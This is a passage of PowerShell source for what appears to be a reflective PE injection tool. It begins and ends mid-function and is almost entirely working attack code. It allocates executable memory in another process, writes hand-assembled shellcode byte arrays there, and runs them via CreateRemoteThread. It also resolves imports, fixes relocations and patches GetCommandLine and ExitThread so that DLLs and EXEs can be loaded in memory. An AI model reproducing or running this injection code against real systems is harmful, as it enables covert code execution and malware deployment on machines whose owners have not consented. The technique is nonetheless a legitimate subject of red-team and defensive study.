			Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

			
			$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($RSCAddr -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for shellcode"
			}
			
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
			if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
			{
				Throw "Unable to write shellcode to remote process memory."
			}
			
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			#The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
			[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
			$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
			if ($Result -eq $false)
			{
				Throw "Call to ReadProcessMemory failed"
			}
			[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			[Int32]$ExitCode = 0
			$Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
			if (($Result -eq 0) -or ($ExitCode -eq 0))
			{
				Throw "Call to GetExitCodeThread failed"
			}
			
			[IntPtr]$DllAddress = [IntPtr]$ExitCode
		}
		
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $DllAddress
	}
	
	
	Function Get-RemoteProcAddress
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$RemoteDllHandle,
		
		[Parameter(Position=2, Mandatory=$true)]
		[IntPtr]
		$FunctionNamePtr,#This can either be a ptr to a string which is the function name, or, if LoadByOrdinal is 'true' this is an ordinal number (points to nothing)

        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        $LoadByOrdinal
		)

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

		[IntPtr]$RFuncNamePtr = [IntPtr]::Zero   #Pointer to the function name in remote process memory if loading by function name, ordinal number if loading by ordinal
        #If not loading by ordinal, write the function name to the remote process memory
        if (-not $LoadByOrdinal)
        {
        	$FunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($FunctionNamePtr)

		    #Write FunctionName to memory (will be used in GetProcAddress)
		    $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
		    $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		    if ($RFuncNamePtr -eq [IntPtr]::Zero)
		    {
			    Throw "Unable to allocate memory in the remote process"
		    }

		    [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
		    if ($Success -eq $false)
		    {
			    Throw "Unable to write DLL path to remote process memory"
		    }
		    if ($FunctionNameSize -ne $NumBytesWritten)
		    {
			    Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		    }
        }
        #If loading by ordinal, just set RFuncNamePtr to be the ordinal number
        else
        {
            $RFuncNamePtr = $FunctionNamePtr
        }
		
		#Get address of GetProcAddress
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes

		
		#Allocate memory for the address returned by GetProcAddress
		$GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
		}
		
		
		#Write Shellcode to the remote process which will call GetProcAddress
		#Shellcode: GetProcAddress.asm
		[Byte[]]$GetProcAddressSC = @()
		if ($PEInfo.PE64Bit -eq $true)
		{
			$GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$GetProcAddressSC2 = @(0x48, 0xba)
			$GetProcAddressSC3 = @(0x48, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
			$GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			$GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			$GetProcAddressSC2 = @(0xb9)
			$GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
			$GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		$SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
		$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
		$SCPSMemOriginal = $SCPSMem
		
		Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
		
		$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if ($RSCAddr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for shellcode"
		}
		
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
		if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
		{
			Throw "Unable to write shellcode to remote process memory."
		}
		
		$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
		$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
		if ($Result -ne 0)
		{
			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		}
		
		#The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
		[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
		$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
		if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
		{
			Throw "Call to ReadProcessMemory failed"
		}
		[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

        #Cleanup remote process memory
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        if (-not $LoadByOrdinal)
        {
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
		
		return $ProcAddress
	}


	Function Copy-Sections
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
		
			#Address to copy the section to
			[IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
			
			#SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
			#    in memory for the section. If VirtualSize &gt; SizeOfRawData, pad the extra spaces with 0. If
			#    SizeOfRawData &gt; VirtualSize, it is because the section stored on disk has padding that we can throw away,
			#    so truncate SizeOfRawData to VirtualSize
			$SizeOfRawData = $SectionHeader.SizeOfRawData

			if ($SectionHeader.PointerToRawData -eq 0)
			{
				$SizeOfRawData = 0
			}
			
			if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
			{
				$SizeOfRawData = $SectionHeader.VirtualSize
			}
			
			if ($SizeOfRawData -gt 0)
			{
				Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
			}
		
			#If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
			if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
			{
				$Difference = $SectionHeader.VirtualSize - $SizeOfRawData
				[IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
				Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
				$Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
			}
		}
	}


	Function Update-MemoryAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$OriginalImageBase,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		[Int64]$BaseDifference = 0
		$AddDifference = $true #Track if the difference variable should be added or subtracted from variables
		[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
		
		#If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
		if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}


		elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
			$AddDifference = $false
		}
		elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
		}
		
		#Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
		[IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			#If SizeOfBlock == 0, we are done
			$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

			if ($BaseRelocationTable.SizeOfBlock -eq 0)
			{
				break
			}

			[IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
			$NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

			#Loop through each relocation
			for($i = 0; $i -lt $NumRelocations; $i++)
			{
				#Get info for this relocation
				$RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
				[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

				#First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
				[UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
				[UInt16]$RelocType = $RelocationInfo -band 0xF000
				for ($j = 0; $j -lt 12; $j++)
				{
					$RelocType = [Math]::Floor($RelocType / 2)
				}

				#For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
				#This appears to be true for EXE's as well.
				#	Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
				if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{			
					#Get the current memory address and update it based off the difference between PE expected base address and actual base address
					[IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
					[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
		
					if ($AddDifference -eq $true)
					{
						[IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}
					else
					{
						[IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}				

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
				}
				elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{
					#IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
					Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
				}
			}
			
			$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
		}
	}


	Function Import-DllImports
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle
		)
		
		$RemoteLoading = $false
		if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
		{
			$RemoteLoading = $true
		}
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done importing DLL imports"
					break
				}

				$ImportDllHandle = [IntPtr]::Zero
				$ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
				
				if ($RemoteLoading -eq $true)
				{
					$ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
				}
				else
				{
					$ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
				}

				if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
				{
					throw "Error importing DLL, DLLName: $ImportDllPath"
				}
				
				#Get the first thunk, then loop through all of them
				[IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
				[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
				[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				
				while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
				{
                    $LoadByOrdinal = $false
                    [IntPtr]$ProcedureNamePtr = [IntPtr]::Zero
					#Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
					#	If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
					#	and doing the comparison, just see if it is less than 0
					[IntPtr]$NewThunkRef = [IntPtr]::Zero
					if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
					}
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
					}
					else
					{
						[IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
						$StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						$ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                        $ProcedureNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ProcedureName)
					}
					
					if ($RemoteLoading -eq $true)
					{
						[IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionNamePtr $ProcedureNamePtr -LoadByOrdinal $LoadByOrdinal
					}
					else
					{
				        [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressIntPtr.Invoke($ImportDllHandle, $ProcedureNamePtr)
					}
					
					if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
					{
                        if ($LoadByOrdinal)
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $ProcedureNamePtr. Dll: $ImportDllPath"
                        }
                        else
                        {
						    Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
                        }
					}

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
					
					$ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

                    #Cleanup
                    #If loading by ordinal, ProcedureNamePtr is the ordinal value and not actually a pointer to a buffer that needs to be freed
                    if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
                        $ProcedureNamePtr = [IntPtr]::Zero
                    }
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}

	Function Get-VirtualProtectValue
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		$SectionCharacteristics
		)
		
		$ProtectionFlag = 0x0
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_NOACCESS
				}
			}
		}
		
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			$ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
		}
		
		return $ProtectionFlag
	}

	Function Update-MemoryProtectionFlags
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
			
			[UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
			[UInt32]$SectionSize = $SectionHeader.VirtualSize
			
			[UInt32]$OldProtectFlag = 0
			Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
			$Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Unable to change memory protection"
			}
		}
	}
	
	#This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
	#Returns an object with addresses to copies of the bytes that were overwritten (and the count)
	Function Update-ExeFunctions
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ExeArguments,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		$ExeDoneBytePtr
		)
		
		#This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
		$ReturnArray = @() 
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$OldProtectFlag = 0
		
		[IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
		if ($Kernel32Handle -eq [IntPtr]::Zero)
		{
			throw "Kernel32 handle null"
		}
		
